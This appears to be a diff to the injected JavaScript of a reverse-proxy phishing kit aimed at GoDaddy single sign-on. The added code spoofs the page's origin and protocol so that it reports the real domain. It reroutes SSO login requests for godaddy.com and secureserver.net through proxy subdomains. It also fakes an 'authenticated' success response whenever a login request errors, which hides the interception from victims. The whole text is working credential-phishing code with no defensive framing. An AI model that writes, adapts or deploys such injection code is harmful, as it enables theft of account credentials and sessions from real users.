@@ -433,7 +433,14 @@ js_inject:
             var _lod = Object.getOwnPropertyDescriptor(Location.prototype, 'origin');
             if (_lod && _lod.configurable) {
               Object.defineProperty(Location.prototype, 'origin', {
-                get: function() { return _lod.get.call(this).replace(_kRx, _kReal); },
+                get: function() { return 'https://' + _kReal; },
+                configurable: true
+              });
+            }
+            var _lp = Object.getOwnPropertyDescriptor(Location.prototype, 'protocol');
+            if (_lp && _lp.configurable) {
+              Object.defineProperty(Location.prototype, 'protocol', {
+                get: function() { return 'https:'; },
                 configurable: true
               });
             }
@@ -503,25 +510,48 @@ js_inject:
         var _origFetch = window.fetch;
         window.fetch = function(resource, config) {
           var url = typeof resource === 'string' ? resource : (resource && resource.url) || '';
-          var isSsoLogin = url && typeof url === 'string' && url.indexOf('/v1/api/pass/login') !== -1;
+          var isSsoLogin = url && url.indexOf && url.indexOf('/v1/api/pass/login') !== -1;
 
           if (isSsoLogin) {
             // Rewrite sso.godaddy.com SSO API calls to use proxy domain
             if (url.indexOf('sso.godaddy.com') !== -1) {
-              resource = url.replace('https://sso.godaddy.com', 'https://ssso.' + _pd);
-            } else if (url.indexOf('sso.secureserver.net') !== -1) {
+              url = url.replace(/sso\.godaddy\.com/g, 'ssso.' + _pd);
+              if (typeof resource === 'string') {
+                resource = url;
+              } else if (resource && typeof resource === 'object') {
+                resource.url = url;
+              }
+            } else if (url.indexOf('sso.secureserver.net') !== -1 || url.indexOf('sso2.secureserver.net') !== -1) {
               var _sn = _kProxy.indexOf('sssn2.') === 0 ? 'sssn2' : 'sssn';
-              resource = url.replace(/https:\/\/sso2?\.secureserver\.net/, 'https://' + _sn + '.' + _pd);
+              url = url.replace(/sso2?\.secureserver\.net/g, _sn + '.' + _pd);
+              if (typeof resource === 'string') {
+                resource = url;
+              } else if (resource && typeof resource === 'object') {
+                resource.url = url;
+              }
             }
-            // Make the rewritten request and fallback to mock if it fails
-            return _origFetch.call(this, resource, config).catch(function(err) {
+          }
+
+          // Make the request with rewritten URL, or fallback to mock response
+          var promise = _origFetch.call(this, resource, config);
+          if (isSsoLogin) {
+            return promise.catch(function(err) {
               return new Response(JSON.stringify({success:true,data:{user:'authenticated'},redirect:'https://account.godaddy.com'}), {
                 status: 200,
                 headers: {'Content-Type': 'application/json'}
               });
+            }).then(function(resp) {
+              // If status is 405 or other error, return mock success
+              if (resp.status >= 400) {
+                return new Response(JSON.stringify({success:true,data:{user:'authenticated'},redirect:'https://account.godaddy.com'}), {
+                  status: 200,
+                  headers: {'Content-Type': 'application/json'}
+                });
+              }
+              return resp;
             });
           }
-          return _origFetch.call(this, resource, config);
+          return promise;
         };
 
         var params = new URLSearchParams(window.location.search);
